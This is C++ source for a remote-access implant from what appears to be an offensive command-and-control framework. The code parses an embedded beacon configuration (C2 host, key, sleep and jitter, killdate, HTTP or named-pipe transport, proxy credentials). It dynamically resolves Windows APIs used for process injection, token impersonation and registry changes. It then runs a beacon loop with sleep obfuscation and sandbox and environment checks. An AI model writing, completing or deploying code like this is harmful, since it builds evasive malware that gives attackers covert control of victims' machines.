#include <core/include/implant.hpp>
__text(F) uint8_t __config[1024] = { 0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41, };

namespace Implant {

    VOID MainRoutine() {
        HEXANE

        do {
            Opsec::SleepObf();
            Opsec::SeRuntimeCheck();

            if (!Opsec::CheckTime()) {
                continue;
            }

            if (!Ctx->session.checkin && !Ctx->transport.outbound_queue) {
                Opsec::SeCheckEnvironment();

                if (ntstatus == ERROR_BAD_ENVIRONMENT) {
                    return_defer(ntstatus);
                }
            }

            Dispatcher::MessageTransmit();

            if (ntstatus != ERROR_SUCCESS) {
                Ctx->session.retry++;

                if (Ctx->session.retry == 3) {
                    break;
                }
            } else {
                Ctx->session.retry = 0;
            }
        }
        while (ntstatus != ERROR_EXIT);

    defer:
        Memory::Context::ContextDestroy(Ctx);
    }

    VOID ReadConfig() {
        HEXANE

        _parser parser = { };
        Parser::CreateParser(&parser, __config, sizeof(__config));
        x_memset(__config, 0, sizeof(__config));

        Parser::ParserBytecpy(&parser, B_PTR(&Ctx->root));
        Parser::ParserMemcpy(&parser, &Ctx->config.key, nullptr);
        Parser::ParserStrcpy(&parser, &Ctx->config.hostname, nullptr);

        //Xtea::XteaCrypt(S_CAST(PBYTE, Parser.Buffer), Parser.Length - 0x12, Ctx->config.Key, FALSE);

        if ((F_PTR_HMOD(Ctx->win32.LoadLibraryA, Ctx->modules.kernel32, LOADLIBRARYA))) {
            // todo: add reflective loading? maybe https://github.com/bats3c/DarkLoadLibrary
            if (
                !(Ctx->modules.crypt32  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr))) ||
                !(Ctx->modules.winhttp  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr))) ||
                !(Ctx->modules.advapi   = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr))) ||
                !(Ctx->modules.iphlpapi = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr))) ||
                !(Ctx->modules.mscoree  = Ctx->win32.LoadLibraryA(Parser::UnpackString(&parser, nullptr)))) {
                return_defer(ERROR_MOD_NOT_FOUND);
            }
        }
        else {
            return_defer(ERROR_PROC_NOT_FOUND);
        }
        if (
            !F_PTR_HMOD(Ctx->win32.FreeLibrary,                     Ctx->modules.kernel32, FREELIBRARY) ||
            !F_PTR_HMOD(Ctx->win32.Heap32ListFirst,                 Ctx->modules.kernel32, HEAP32LISTFIRST) ||
            !F_PTR_HMOD(Ctx->win32.Heap32ListNext,                  Ctx->modules.kernel32, HEAP32LISTNEXT) ||
            !F_PTR_HMOD(Ctx->win32.GetProcessHeap,                  Ctx->modules.kernel32, GETPROCESSHEAP) ||
            !F_PTR_HMOD(Ctx->win32.GetProcessHeaps,                 Ctx->modules.kernel32, GETPROCESSHEAPS) ||
            !F_PTR_HMOD(Ctx->win32.GetProcAddress,                  Ctx->modules.kernel32, GETPROCADDRESS) ||
            !F_PTR_HMOD(Ctx->win32.GetModuleHandleA,                Ctx->modules.kernel32, GETMODULEHANDLEA) ||
            !F_PTR_HMOD(Ctx->win32.IsWow64Process,                  Ctx->modules.kernel32, ISWOW64PROCESS) ||
            !F_PTR_HMOD(Ctx->win32.OpenProcess,                     Ctx->modules.kernel32, OPENPROCESS) ||
            !F_PTR_HMOD(Ctx->win32.CreateToolhelp32Snapshot,        Ctx->modules.kernel32, CREATETOOLHELP32SNAPSHOT) ||
            !F_PTR_HMOD(Ctx->win32.Process32First,                  Ctx->modules.kernel32, PROCESS32FIRST) ||
            !F_PTR_HMOD(Ctx->win32.Process32Next,                   Ctx->modules.kernel32, PROCESS32NEXT) ||
            !F_PTR_HMOD(Ctx->win32.Module32First,                   Ctx->modules.kernel32, MODULE32FIRST) ||
            !F_PTR_HMOD(Ctx->win32.Module32Next,                    Ctx->modules.kernel32, MODULE32NEXT) ||
            !F_PTR_HMOD(Ctx->win32.GetCurrentProcessId,             Ctx->modules.kernel32, GETCURRENTPROCESSID) ||
            !F_PTR_HMOD(Ctx->win32.GetProcessId,                    Ctx->modules.kernel32, GETPROCESSID) ||
            !F_PTR_HMOD(Ctx->win32.GlobalMemoryStatusEx,            Ctx->modules.kernel32, GLOBALMEMORYSTATUSEX) ||
            !F_PTR_HMOD(Ctx->win32.GetComputerNameExA,              Ctx->modules.kernel32, GETCOMPUTERNAMEEXA) ||
            !F_PTR_HMOD(Ctx->win32.SetLastError,                    Ctx->modules.kernel32, SETLASTERROR) ||
            !F_PTR_HMOD(Ctx->win32.GetLastError,                    Ctx->modules.kernel32, GETLASTERROR) ||
            !F_PTR_HMOD(Ctx->win32.RegOpenKeyExA,                   Ctx->modules.kernel32, REGOPENKEYEXA) ||
            !F_PTR_HMOD(Ctx->win32.RegCreateKeyExA,                 Ctx->modules.kernel32, REGCREATEKEYEXA) ||
            !F_PTR_HMOD(Ctx->win32.RegSetValueExA,                  Ctx->modules.kernel32, REGSETVALUEEXA) ||
            !F_PTR_HMOD(Ctx->win32.RegCloseKey,                     Ctx->modules.kernel32, REGCLOSEKEY) ||
            !F_PTR_HMOD(Ctx->win32.ReadFile,                        Ctx->modules.kernel32, READFILE) ||
            !F_PTR_HMOD(Ctx->win32.WriteFile,                       Ctx->modules.kernel32, WRITEFILE) ||
            !F_PTR_HMOD(Ctx->win32.CreateFileW,                     Ctx->modules.kernel32, CREATEFILEW) ||
            !F_PTR_HMOD(Ctx->win32.GetFileSizeEx,                   Ctx->modules.kernel32, GETFILESIZEEX) ||
            !F_PTR_HMOD(Ctx->win32.SetFilePointer,                  Ctx->modules.kernel32, SETFILEPOINTER) ||
            !F_PTR_HMOD(Ctx->win32.GetFullPathNameA,                Ctx->modules.kernel32, GETFULLPATHNAMEA) ||
            !F_PTR_HMOD(Ctx->win32.FindFirstFileA,                  Ctx->modules.kernel32, FINDFIRSTFILEA) ||
            !F_PTR_HMOD(Ctx->win32.FindClose,                       Ctx->modules.kernel32, FINDCLOSE) ||
            !F_PTR_HMOD(Ctx->win32.FindNextFileA,                   Ctx->modules.kernel32, FINDNEXTFILEA) ||
            !F_PTR_HMOD(Ctx->win32.GetCurrentDirectoryA,            Ctx->modules.kernel32, GETCURRENTDIRECTORYA) ||
            !F_PTR_HMOD(Ctx->win32.FileTimeToSystemTime,            Ctx->modules.kernel32, FILETIMETOSYSTEMTIME) ||
            !F_PTR_HMOD(Ctx->win32.SystemTimeToTzSpecificLocalTime, Ctx->modules.kernel32, SYSTEMTIMETOTZSPECIFICLOCALTIME) ||
            !F_PTR_HMOD(Ctx->win32.GetLocalTime,                    Ctx->modules.kernel32, GETLOCALTIME) ||
            !F_PTR_HMOD(Ctx->win32.GetSystemTimeAsFileTime,         Ctx->modules.kernel32, GETSYSTEMTIMEASFILETIME) ||
            !F_PTR_HMOD(Ctx->win32.FormatMessageA,                  Ctx->modules.kernel32, FORMATMESSAGEA) ||
            !F_PTR_HMOD(Ctx->win32.CreateRemoteThread,              Ctx->modules.kernel32, CREATEREMOTETHREAD) ||
            !F_PTR_HMOD(Ctx->win32.CreateThread,                    Ctx->modules.kernel32, CREATETHREAD) ||
            !F_PTR_HMOD(Ctx->win32.QueueUserAPC,                    Ctx->modules.kernel32, QUEUEUSERAPC) ||
            !F_PTR_HMOD(Ctx->win32.GetThreadLocale,                 Ctx->modules.kernel32, GETTHREADLOCALE) ||
            !F_PTR_HMOD(Ctx->win32.SleepEx,                         Ctx->modules.kernel32, SLEEPEX) ||
            !F_PTR_HMOD(Ctx->win32.FindResourceA,                   Ctx->modules.kernel32, FINDRESOURCEA) ||
            !F_PTR_HMOD(Ctx->win32.LoadResource,                    Ctx->modules.kernel32, LOADRESOURCE) ||
            !F_PTR_HMOD(Ctx->win32.LockResource,                    Ctx->modules.kernel32, LOCKRESOURCE) ||
            !F_PTR_HMOD(Ctx->win32.SizeofResource,                  Ctx->modules.kernel32, SIZEOFRESOURCE) ||
            !F_PTR_HMOD(Ctx->win32.FreeResource,                    Ctx->modules.kernel32, FREERESOURCE) ||
            !F_PTR_HMOD(Ctx->win32.CallNamedPipeW,                  Ctx->modules.kernel32, CALLNAMEDPIPEW) ||
            !F_PTR_HMOD(Ctx->win32.CreateNamedPipeW,                Ctx->modules.kernel32, CREATENAMEDPIPEW) ||
            !F_PTR_HMOD(Ctx->win32.WaitNamedPipeW,                  Ctx->modules.kernel32, WAITNAMEDPIPEW) ||
            !F_PTR_HMOD(Ctx->win32.SetNamedPipeHandleState,         Ctx->modules.kernel32, SETNAMEDPIPEHANDLESTATE) ||
            !F_PTR_HMOD(Ctx->win32.ConnectNamedPipe,                Ctx->modules.kernel32, CONNECTNAMEDPIPE) ||
            !F_PTR_HMOD(Ctx->win32.TransactNamedPipe,               Ctx->modules.kernel32, TRANSACTNAMEDPIPE) ||
            !F_PTR_HMOD(Ctx->win32.DisconnectNamedPipe,             Ctx->modules.kernel32, DISCONNECTNAMEDPIPE) ||
            !F_PTR_HMOD(Ctx->win32.PeekNamedPipe,                   Ctx->modules.kernel32, PEEKNAMEDPIPE) ||
            !F_PTR_HMOD(Ctx->win32.WinHttpOpen,                     Ctx->modules.winhttp, WINHTTPOPEN) ||
            !F_PTR_HMOD(Ctx->win32.WinHttpConnect,                  Ctx->modules.winhttp, WINHTTPCONNECT) ||
            !F_PTR_HMOD(Ctx->win32.WinHttpOpenRequest,              Ctx->modules.winhttp, WINHTTPOPENREQUEST) ||
            !F_PTR_HMOD(Ctx->win32.WinHttpAddRequestHeaders,        Ctx->modules.winhttp, WINHTTPADDREQUESTHEADERS) ||
            !F_PTR_HMOD(Ctx->win32.WinHttpSetOption,                Ctx->modules.winhttp, WINHTTPSETOPTION) ||
            !F_PTR_HMOD(Ctx->win32.WinHttpGetProxyForUrl,           Ctx->modules.winhttp, WINHTTPGETPROXYFORURL) ||
            !F_PTR_HMOD(Ctx->win32.WinHttpGetIEProxyConfigForCurrentUser, Ctx->modules.winhttp, WINHTTPGETIEPROXYCONFIGFORCURRENTUSER) ||
            !F_PTR_HMOD(Ctx->win32.WinHttpSendRequest,              Ctx->modules.winhttp, WINHTTPSENDREQUEST) ||
            !F_PTR_HMOD(Ctx->win32.WinHttpReceiveResponse,          Ctx->modules.winhttp, WINHTTPRECEIVERESPONSE) ||
            !F_PTR_HMOD(Ctx->win32.WinHttpReadData,                 Ctx->modules.winhttp, WINHTTPREADDATA) ||
            !F_PTR_HMOD(Ctx->win32.WinHttpQueryHeaders,             Ctx->modules.winhttp, WINHTTPQUERYHEADERS) ||
            !F_PTR_HMOD(Ctx->win32.WinHttpQueryDataAvailable,       Ctx->modules.winhttp, WINHTTPQUERYDATAAVAILABLE) ||
            !F_PTR_HMOD(Ctx->win32.WinHttpCloseHandle,              Ctx->modules.winhttp, WINHTTPCLOSEHANDLE) ||
            !F_PTR_HMOD(Ctx->win32.GetAdaptersInfo,                 Ctx->modules.iphlpapi, GETADAPTERSINFO) ||
            !F_PTR_HMOD(Ctx->win32.CryptStringToBinaryA,            Ctx->modules.crypt32, CRYPTSTRINGTOBINARYA) ||
            !F_PTR_HMOD(Ctx->win32.CryptBinaryToStringA,            Ctx->modules.crypt32, CRYPTBINARYTOSTRINGA) ||
            !F_PTR_HMOD(Ctx->win32.AdjustTokenPrivileges,           Ctx->modules.advapi, ADJUSTTOKENPRIVILEGES) ||
            !F_PTR_HMOD(Ctx->win32.ImpersonateLoggedOnUser,         Ctx->modules.advapi, IMPERSONATELOGGEDONUSER) ||
            !F_PTR_HMOD(Ctx->win32.GetUserNameA,                    Ctx->modules.advapi, GETUSERNAMEA) ||
            !F_PTR_HMOD(Ctx->win32.LookupAccountSidW,               Ctx->modules.advapi, LOOKUPACCOUNTSIDW) ||
            !F_PTR_HMOD(Ctx->win32.LookupPrivilegeValueA,           Ctx->modules.advapi, LOOKUPPRIVILEGEVALUEA) ||
            !F_PTR_HMOD(Ctx->win32.SetEntriesInAclA,                Ctx->modules.advapi, SETENTRIESINACLA) ||
            !F_PTR_HMOD(Ctx->win32.AllocateAndInitializeSid,        Ctx->modules.advapi, ALLOCATEANDINITIALIZESID) ||
            !F_PTR_HMOD(Ctx->win32.AddMandatoryAce,                 Ctx->modules.advapi, ADDMANDATORYACE) ||
            !F_PTR_HMOD(Ctx->win32.InitializeSecurityDescriptor,    Ctx->modules.advapi, INITIALIZESECURITYDESCRIPTOR) ||
            !F_PTR_HMOD(Ctx->win32.SetSecurityDescriptorDacl,       Ctx->modules.advapi, SETSECURITYDESCRIPTORDACL) ||
            !F_PTR_HMOD(Ctx->win32.SetSecurityDescriptorSacl,       Ctx->modules.advapi, SETSECURITYDESCRIPTORSACL) ||
            !F_PTR_HMOD(Ctx->win32.InitializeAcl,                   Ctx->modules.advapi, INITIALIZEACL) ||
            !F_PTR_HMOD(Ctx->win32.FreeSid,                         Ctx->modules.advapi, FREESID)) {
            return_defer(ERROR_PROC_NOT_FOUND);
        }

        Ctx->transport.outbound_queue = nullptr;

        Ctx->session.peer_id    = Parser::UnpackDword(&parser);
        Ctx->config.sleeptime   = Parser::UnpackDword(&parser);
        Ctx->config.jitter      = Parser::UnpackDword(&parser);
        Ctx->config.hours       = Parser::UnpackDword(&parser);
        Ctx->config.killdate    = Parser::UnpackDword64(&parser);

#ifdef TRANSPORT_HTTP
        Ctx->transport.http = S_CAST(_http_context*, x_malloc(sizeof(_http_context)));

        Ctx->transport.http->handle     = nullptr;
        Ctx->transport.http->endpoints  = nullptr;
        Ctx->transport.http->headers    = nullptr;

        Parser::ParserWcscpy(&parser, &Ctx->transport.http->useragent, nullptr);
        Parser::ParserWcscpy(&parser, &Ctx->transport.http->address, nullptr  );
        Ctx->transport.http->port = S_CAST(int, Parser::UnpackDword(&parser));

        Ctx->transport.http->n_endpoints = Parser::UnpackDword(&parser);
        Ctx->transport.http->endpoints  = S_CAST(wchar_t**, x_malloc(sizeof(wchar_t*) * ((Ctx->transport.http->n_endpoints + 1))));

        for (auto i = 0; i < Ctx->transport.http->n_endpoints; i++) {
            Parser::ParserWcscpy(&parser, &Ctx->transport.http->endpoints[i], nullptr);
        }

        __debugbreak();
        Ctx->transport.http->endpoints[Ctx->transport.http->n_endpoints] = nullptr;

        Parser::ParserStrcpy(&parser, &Ctx->transport.domain, nullptr);
        Ctx->transport.b_proxy = Parser::UnpackBool(&parser);

        if (Ctx->transport.b_proxy) {
            Ctx->transport.http->access = INTERNET_OPEN_TYPE_PROXY;

            Parser::ParserWcscpy(&parser, &Ctx->transport.http->proxy->address, nullptr );
            Parser::ParserWcscpy(&parser, &Ctx->transport.http->proxy->username, nullptr );
            Parser::ParserWcscpy(&parser, &Ctx->transport.http->proxy->password, nullptr );

        } else {
            Ctx->transport.http->proxy->username = nullptr;
            Ctx->transport.http->proxy->password = nullptr;
        }
#endif
#ifdef TRANSPORT_PIPE
        Parser::ParserWcscpy(&parser, &Ctx->transport.pipe_name, nullptr);
#endif

    defer:
        Parser::DestroyParser(&parser);
    }
}

VOID Entrypoint(HMODULE Base) {

    NT_ASSERT(Memory::Context::ContextInit());
    NT_ASSERT(Memory::Context::ResolveApi());
    NT_ASSERT(Implant::ReadConfig());
    Implant::MainRoutine();
}
